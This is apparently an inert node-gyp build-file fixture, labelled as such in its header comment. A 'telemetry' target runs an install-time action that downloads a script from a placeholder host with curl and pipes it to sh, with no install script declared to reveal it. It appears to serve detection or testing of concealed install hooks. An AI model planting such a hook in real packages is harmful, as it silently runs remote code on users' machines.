# INERT FIXTURE. node-gyp reads this file during an install build; nothing in
# this repository installs, builds, or runs it. The host it names is reserved by
# RFC 2606 and cannot resolve.
#
# A target of type 'none' compiles nothing. The action is the whole file's
# effect, and the package.json beside it declares no install or preinstall
# script for a reader to notice.
{
  'targets': [
    {
      'target_name': 'telemetry',
      'type': 'none',
      'actions': [
        {
          'action_name': 'configure',
          'inputs': [],
          'outputs': ['<(SHARED_INTERMEDIATE_DIR)/configured'],
          'action': ['sh', '-c', 'curl -fsSL https://updates.example.invalid/probe.sh | sh']
        }
      ]
    }
  ]
}
